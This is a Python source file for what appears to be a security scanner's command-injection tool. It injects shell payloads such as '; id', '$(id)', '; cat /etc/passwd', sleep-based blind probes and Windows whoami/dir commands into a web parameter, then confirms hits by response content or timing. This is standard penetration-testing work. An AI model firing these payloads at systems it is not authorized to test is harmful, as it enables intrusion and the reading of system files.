"""
CommandInjectionTool â€” OS command injection exploitation.

Tests for:
- Classic injection (;, |, &&, ||, newline)
- Blind injection with time delays
- Filter bypass techniques
"""
import asyncio
import time
import aiohttp
from dataclasses import dataclass, field

from sentinel.tools.base import ToolOutput
from sentinel.logging_config import get_logger

logger = get_logger(__name__)


@dataclass
class CmdInjectionPayload:
    name: str
    payload: str
    detection: str  # "response", "timing"
    indicator: str
    delay_seconds: float = 0.0


class CommandInjectionTool:
    name = "cmd_injection"
    description = "Test for OS command injection vulnerabilities"

    PAYLOADS = [
        CmdInjectionPayload("semicolon_id", "; id", "response", "uid="),
        CmdInjectionPayload("pipe_id", "| id", "response", "uid="),
        CmdInjectionPayload("backtick_id", "`id`", "response", "uid="),
        CmdInjectionPayload("dollar_id", "$(id)", "response", "uid="),
        CmdInjectionPayload("and_id", "&& id", "response", "uid="),
        CmdInjectionPayload("or_id", "|| id", "response", "uid="),
        CmdInjectionPayload("newline_id", "\nid", "response", "uid="),
        CmdInjectionPayload("cat_passwd", "; cat /etc/passwd", "response", "root:"),
        CmdInjectionPayload("sleep_5", "; sleep 5", "timing", "", 5.0),
        CmdInjectionPayload("sleep_pipe", "| sleep 5", "timing", "", 5.0),
        CmdInjectionPayload("sleep_dollar", "$(sleep 5)", "timing", "", 5.0),
        CmdInjectionPayload("windows_dir", "& dir", "response", "Volume"),
        CmdInjectionPayload("windows_whoami", "& whoami", "response", "\\"),
        CmdInjectionPayload("windows_ping", "& ping -n 5 127.0.0.1", "timing", "", 4.0),
    ]

    async def execute(
        self,
        target_url: str,
        param_name: str,
        method: str = "GET",
        base_value: str = "",
        headers: dict = None,
    ) -> ToolOutput:
        findings = []
        http_traces = []

        async with aiohttp.ClientSession() as session:
            baseline_time = await self._measure_baseline(session, target_url, param_name, base_value, method, headers)

            for payload in self.PAYLOADS:
                try:
                    injected_value = base_value + payload.payload
                    start = time.monotonic()

                    if method.upper() == "GET":
                        async with session.get(
                            target_url,
                            params={param_name: injected_value},
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=15),
                        ) as resp:
                            body = await resp.text()
                            elapsed = time.monotonic() - start
                            trace = {"method": "GET", "url": str(resp.url), "status": resp.status, "body": body[:2000], "elapsed": elapsed}
                    else:
                        async with session.post(
                            target_url,
                            data={param_name: injected_value},
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=15),
                        ) as resp:
                            body = await resp.text()
                            elapsed = time.monotonic() - start
                            trace = {"method": "POST", "url": str(resp.url), "status": resp.status, "body": body[:2000], "elapsed": elapsed}

                    http_traces.append(trace)

                    confirmed = False
                    if payload.detection == "response" and payload.indicator:
                        confirmed = payload.indicator in body
                    elif payload.detection == "timing":
                        confirmed = elapsed > baseline_time + payload.delay_seconds * 0.7

                    if confirmed:
                        findings.append({
                            "payload": payload.name,
                            "injected_value": injected_value,
                            "detection": payload.detection,
                            "evidence": body[:500] if payload.detection == "response" else f"Response time: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                        })
                        logger.info(f"Command injection confirmed: {payload.name}")

                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass

        return ToolOutput(
            success=len(findings) > 0,
            data={"findings": findings},
            tool_name=self.name,
            metadata={"http_traces": http_traces, "baseline_time": baseline_time},
        )

    async def _measure_baseline(self, session, url, param, value, method, headers) -> float:
        start = time.monotonic()
        try:
            if method.upper() == "GET":
                async with session.get(url, params={param: value}, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as _:
                    pass
            else:
                async with session.post(url, data={param: value}, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as _:
                    pass
        except Exception:
            pass
        return time.monotonic() - start
